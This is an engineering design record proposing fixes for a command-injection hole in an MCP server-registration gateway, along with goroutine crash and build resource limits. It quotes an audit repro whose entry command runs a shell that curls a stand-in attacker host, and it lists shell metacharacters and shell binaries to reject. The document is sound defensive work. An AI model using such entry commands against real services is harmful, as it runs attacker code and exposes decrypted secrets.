# ADR-0010: Harden the MCP gateway command-execution path (allowlist + sandbox + safe-goroutine + build budget)

- **Status:** Proposed
- **Date:** 2026-05-15
- **Authors:** ADR Drafter (Backend Engineer role)
- **Reviewers required:** Tech Lead; Security Engineer (mandatory veto — touches the RCE surface, per `docs/ROLES.md` §2.2 and §3.1 Type-1 classification)
- **Supersedes:** none
- **Related:** ADR-0005 (`RequireProjectAccess` middleware — see §Context on scope intersection), `docs/THREAT_MODEL.md` §6 (lines 128-135, added 2026-05-15), `docs/audits/SECURITY_AUDIT_2026-05-15.md` A03-F1, `docs/audits/BACKEND_CRASH_RISKS.md` rows #1, #2 (`handlers_mcp.go:47, :163`), `docs/audits/BACKEND_SPOF.md` row #9 (`handlers_mcp.go:47,163`)

---

## Context

The MCP hub lets authenticated users register an MCP server (`POST /api/v1/mcp/servers`) by supplying a GitHub URL and a free-form `EntryCommand` string. The backend then clones, builds, and — at tool-call time — executes that command with decrypted project secrets piped into its environment. Three independent audit findings converge on the same code paths.

**Finding 1 — A03-F1, P1 Critical (authenticated RCE primitive).** Verbatim from `docs/audits/SECURITY_AUDIT_2026-05-15.md:180-194`:

> *"A03-F1 — Command injection via MCP entry command (P1 Critical). Evidence: `backend/internal/api/handlers_mcp_gateway.go:327-339`. `server.EntryCommand` is a string field set on registration (`handlers_mcp.go:39`, `mcp_service.go:46`). `strings.Fields(server.EntryCommand)` splits, then `exec.Command(parts[0], parts[1:]...)` executes. Repro: 1. Authenticated user registers an MCP server with `entry_command: "/bin/sh -c 'curl http://attacker.example/...'"` — `exec.Command` honors `parts[0]` as the program name verbatim, so `/bin/sh -c '...'` works. 2. Attacker issues an MCP tool call; the container executes the attacker's command with the container's permissions, with `cmd.Env` containing decrypted secrets. Severity P1 because: decrypted secrets are passed as env vars (`handlers_mcp_gateway.go:301`); the build dir is on the API container filesystem; any user can register (registration is per-user, not admin-gated). Fix: restrict to an allowlist of entry-command binaries; reject shell-metacharacter words; better: sandbox MCP execution (containerized); best: do not pass plaintext secrets via env to a user-controlled binary — the architectural root cause."*

**Finding 2 — 6 critical goroutine-no-recover crashes** (`docs/audits/BACKEND_CRASH_RISKS.md` rows #1, #2 at lines 43-44):

> *"`handlers_mcp.go:47` goroutine-no-recover — `BuildServer` panics (e.g. nil pointer in `s.mcpRepo` / json unmarshal of malformed `package.json`). Impact: process death — entire API server. Critical."*
> *"`handlers_mcp.go:163` goroutine-no-recover — `RebuildServer` → `BuildServer` panic in goroutine. Impact: process death. Critical."*

The crash audit lists these two plus four further critical no-recover sites (webhook, two eventbus, plugins) — six criticals total — and notes (§3.1 line 127) "Apply the same to all 9 production goroutine sites." This ADR mandates the harness for the MCP pair (the user-triggerable members); a follow-up covers the rest.

**Finding 3 — MCP build DoS** (`docs/audits/BACKEND_SPOF.md` row #9, line 85):

> *"MCP build runs unbounded subprocess from API call (`handlers_mcp.go:47,163`; `mcp_builder_service.go:111,144`). `git clone`, `npm install`, `pip install`, `go build` run with no timeout, no concurrency limit, no resource cap. Any user with MCP scope can pin CPU/disk by registering many large repos; build dir `/tmp/keepsave-mcp-builds` grows unbounded. Fix: `exec.CommandContext` with 5-min timeout, per-user concurrency cap, disk quota, dedicated builder pod."*

Common root cause: unconstrained user input becomes a launch command, run without containment, recovery, or resource bounds. `docs/THREAT_MODEL.md` §6 lines 128-135 (added 2026-05-15) carries the matching STRIDE rows — T for RCE, D for builds. This ADR is the implementation contract for closing them.

**Intersection with ADR-0005.** ADR-0005 mounts `RequireProjectAccess` on `/projects/:id/*` routes. MCP routes (`router.go:259-275`) are mounted under `/api/v1/mcp/*` — **not** `/projects/:id/*` — so ADR-0005 does **not** gate this surface today. Project-scope binding happens inside `executeMCPToolCall` via the `MCPInstallation.ProjectID` join. Moving routes under `/projects/:id/mcp/*` is out of scope here.

## Options considered

### Option A — Remove MCP gateway entirely

- **How:** delete `/api/v1/mcp/*` routes; archive `handlers_mcp*.go` and `mcp_builder_service.go`.
- **Pros:** eliminates the surface; zero residual risk.
- **Cons:** customers (per CLAUDE.md §Architecture, `Roadmap.md`) depend on MCP — removal is a product regression. Rejected on product grounds.

### Option B — Container-per-build sandbox (Kubernetes Job / Docker)

- **How:** each build and tool call runs in a separate container with cgroups, seccomp, and egress controls; secrets via tmpfs not env; the API container never directly executes user binaries.
- **Pros:** strongest isolation; closes A03-F1 architecturally; cgroup resource caps come for free.
- **Cons:** requires a container runtime co-located with the API (K8s Job dispatcher, Docker-in-Docker, or Firecracker); CLAUDE.md §Tech Stack lists Docker Compose, not K8s; week+ of work.

### Option C — Allowlist + in-process sandbox + safe-goroutine + build budget (this ADR)

- **How:** four matched fixes; A03-F1 gets two defense layers. See **Decision**.
- **Pros:** single-PR; no new infra; can land before container-runtime work begins.
- **Cons:** in-process sandboxing is weaker than B; allowlist must be curated; `safego` is a band-aid for Go's lack of try/catch.

## Decision

**Adopt Option C as Phase A. Commit to Option B as the Phase B target** once a container-runtime dependency is acceptable (no current ETA — tracked in `docs/FOLLOWUPS.md`). Phase A has four independently rollback-able parts:

**Part A — Interpreter allowlist for `EntryCommand`.** MCP servers MUST declare `Interpreter` as one of `{"node", "python", "go-binary"}` (initial set; extension process per OQ-1). `EntryCommand` becomes `[]string` argv (no shell). `MCPService.RegisterServer` rejects unknown interpreters and argv elements with shell metacharacters (`;`, `|`, `&`, `$`, backticks, redirects). `executeMCPToolCall` re-validates at exec time (defense in depth). `go-binary` resolves to the build-output path inside the per-server build dir — not user-supplied.

**Part B — Sandboxed exec call.** `handlers_mcp_gateway.go:332` becomes `exec.CommandContext(ctx, ...)` with per-call timeout (default 5 min, env `MCP_EXEC_TIMEOUT`). `cmd.Env` is built from the decrypted env-mappings only — `os.Environ()` is **not** inherited (closes leak of API server secrets into the child). Output bounded at 4 MB via `io.LimitReader`. **Phase A bar**: explicit env, timeout, output cap. **Phase B target**: secrets via unix-socket handshake (closes `/proc/<pid>/environ` side channel); chroot or container per call.

**Part C — `safego` goroutine harness.** New package `backend/internal/runtime/safego` exporting `Launch(ctx, name, fn)` wrapping the goroutine in `defer func(){ if r := recover(); r != nil { logger.Error(...stack...) } }()`. Replace the bare `go ...` at `handlers_mcp.go:47` and `:163` with `safego.Launch(...)`.

**Part D — Build resource budget.** Bounded worker pool in `mcp_builder_service`: default 2 concurrent (env `MCP_BUILD_CONCURRENCY`); per-build context timeout 5 min (env `MCP_BUILD_TIMEOUT`); per-project disk budget 1 GB (env `MCP_BUILD_DISK_BUDGET_BYTES`), checked pre-clone and after each phase. `RegisterServer` returns 429 over budget. Queued builds report a new `queued` status for UI surfacing.

## Rejection rationale

- **Option A (remove MCP):** product regression; customers depend on the feature.
- **Option B (container-per-build):** correct end-state but ships in weeks not days. We cannot leave an authenticated-RCE primitive open while we build infra. Phase A closes the bleeding; B is the migration target.

## Consequences

- **Operational:** new env vars (`MCP_EXEC_TIMEOUT`, `MCP_BUILD_TIMEOUT`, `MCP_BUILD_CONCURRENCY`, `MCP_BUILD_DISK_BUDGET_BYTES`); new `docs/RUNBOOK.md` entry for "MCP build queued / over budget"; new audit events `mcp.register_rejected`, `mcp.exec_rejected`, `mcp.build_panic_recovered`, `mcp.build_over_budget` (prerequisite: `docs/AUDIT_LOG_COVERAGE.md` taxonomy expansion).
- **Security:** trust boundary **narrows** — allowlist + scrubbed env removes the authenticated-RCE primitive (A03-F1 residual: Critical → Low). `docs/THREAT_MODEL.md` §6 rows T and D are addressed by Phase A; rows remain with updated mitigation refs to this ADR.
- **Migration:** new `mcp_servers.interpreter` column (TEXT NOT NULL, CHECK); `entry_command` semantics change from "space-separated free-form" to "argv array". Shim parses existing rows via `strings.Fields` **only if** the first token is allowlisted, else marks `status='quarantined'` and requires owner re-registration.
- **Reversibility:** A/B/C/D revert independently (see Rollback). Quarantine state is reversible by operator UPDATE.

## Implementation plan

1. **`backend/internal/runtime/safego/safego.go`** (new): `Launch(ctx, name, fn)` with recover wrapper, structured-log on panic, panic counter to `internal/metrics`.
2. **`backend/internal/models/mcp.go:17`**: add `Interpreter string`; change `EntryCommand` to `EntryArgs []string` (JSON back-compat shim on unmarshal).
3. **`backend/internal/service/mcp_service.go:29-60`** (`RegisterServer`): take `interpreter` and `entryArgs []string`; reject unknown interpreter or shell-metacharacter argv; emit `mcp.register_rejected` audit event on rejection.
4. **`backend/internal/api/handlers_mcp.go:47, :163`**: replace `go ...` with `safego.Launch(c.Request.Context(), "mcp_build", func(ctx){ h.builderService.BuildServer(ctx, server.ID) })` and analogous for rebuild. Thread `context.Context` through builder signatures.
5. **`backend/internal/api/handlers_mcp_gateway.go:307-342`**: `ctx, cancel := context.WithTimeout(c.Request.Context(), execTimeout)`; re-validate interpreter; `cmd := exec.CommandContext(ctx, interpreterPath, server.EntryArgs...)`; `cmd.Env = envVars` (replaces `append(cmd.Env, envVars...)` — eliminates os-env leak); pipe stdout through `io.LimitReader(stdout, 4<<20)`.
6. **`backend/internal/service/mcp_builder_service.go:111, 140-182`**: all `exec.Command` → `exec.CommandContext`; bounded worker pool (`semaphore.NewWeighted`); pre-clone disk-budget check.
7. **Migration `backend/migrations/00NN_mcp_interpreter.sql`**: `ALTER TABLE mcp_servers ADD COLUMN interpreter TEXT NOT NULL DEFAULT 'node' CHECK (interpreter IN ('node','python','go-binary'))`; backfill via shim; quarantine offending rows.
8. **Tests** (per `tests/PYRAMID.md`):
   - Unit: malicious `EntryCommand` (`sh -c ...`, `/bin/bash`, metachar argv) rejected at register-time.
   - Unit: allowlisted (`node`, `python`) accepted; exec uses `CommandContext`; env contains *only* mapped vars (assert `KEEPSAVE_MASTER_KEY` absent).
   - Unit: `safego.Launch` with panicking `fn` does **not** kill process; emits log + audit event.
   - Integration: 3 concurrent register calls; 2 build at once; third reports `queued`.
   - Integration: project-over-budget rejects registration with 429 + `mcp.build_over_budget` audit row.

## Rollback plan

**Each of the 4 parts reverts independently** — partial rollback is supported and is the expected response to any single part going wrong.

- **Part A (allowlist):** ship behind env flag `MCP_INTERPRETER_ALLOWLIST_ENFORCED=true|false`. Setting `false` reinstates "accept any command" during the rollback window. **Reversible without redeploy.**
- **Part B (sandboxed exec):** revert the `handlers_mcp_gateway.go` exec-call diff; explicit-env and timeout changes are independent and can roll back separately. **Reversible.**
- **Part C (`safego`):** delete the `safego.Launch` call sites and restore the bare `go ...` statements. Single-file change, no schema. **Trivially reversible.**
- **Part D (budget):** set `MCP_BUILD_CONCURRENCY=0` and `MCP_BUILD_DISK_BUDGET_BYTES=0` to disable enforcement without code change. **Reversible via env.**

**If A breaks a customer integration** (most likely trigger): keep B+C+D, set `MCP_INTERPRETER_ALLOWLIST_ENFORCED=false`, ship a follow-up adding the missing interpreter, re-enable. Customer unblocked in minutes; RCE primitive **still partially mitigated** by B (scrubbed env, context timeout) during the gap.

**Migration:** the `interpreter` column is additive; quarantine is reversible via UPDATE. Original `entry_command` preserved in `legacy_entry_command` for one release cycle.

## Open questions

1. **(Owner: Security Engineer. Due: before merge.)** Is the initial allowlist `{"node", "python", "go-binary"}` exhaustive? Customers have asked for `ruby` and `php`. What is the acceptance process for adding interpreters — security review per addition, or a standing policy ("must be in the base image, must not invoke a shell by default, must not have a flag re-enabling shell evaluation")?
2. **(Owner: Security Engineer. Due: before merge.)** Decrypted-secrets transport: is **explicit-env-no-`os.Environ`-leak** acceptable for Phase A (audit "Fix" bullets 1-3), or must the **unix-socket handshake** (audit bullet 4, architectural root-cause fix) ship before acceptance? Unix-socket adds ~1 week and requires changes to the MCP client SDK shipped to user containers.
3. **(Owner: Tech Lead + Backend Engineer. Due: before merge.)** Worker-pool sizing: default 2 concurrent builds is conservative; operators with many small projects will see "queued" frequently. Global cap (2) or per-project (1 per project, unlimited globally)? What is the operator UX for "why is my build queued" — a status field, a Prometheus metric, both?

## References

- `backend/internal/api/handlers_mcp.go:47, :163` — goroutine spawns (→ `safego.Launch`)
- `backend/internal/api/handlers_mcp_gateway.go:307-342` — `executeMCPToolCall` (lines 327-339 are A03-F1 evidence)
- `backend/internal/models/mcp.go:17` — `MCPServer.EntryCommand` (→ `EntryArgs []string`; add `Interpreter string`)
- `backend/internal/service/mcp_service.go:29-60` — `RegisterServer` (add allowlist validation)
- `backend/internal/service/mcp_builder_service.go:111, 140-182` — `exec.Command` sites (all → `exec.CommandContext`)
- `backend/internal/api/router.go:259-275` — MCP routes mounted at `/api/v1/mcp/*` (not `/projects/:id/mcp/*`; see Context for ADR-0005 intersection)
- `docs/audits/SECURITY_AUDIT_2026-05-15.md:180-194` (A03-F1)
- `docs/audits/BACKEND_CRASH_RISKS.md:43-44` (crash rows #1, #2), §3.1 lines 93-127
- `docs/audits/BACKEND_SPOF.md:85` (SPOF row #9)
- `docs/THREAT_MODEL.md` §6 lines 128-135 (T and D, added 2026-05-15)
- `docs/ROLES.md` §3.1 (Type-1 — RCE surface, Security Engineer veto)
- ADR-0005 (`RequireProjectAccess` — does **not** gate MCP routes today)
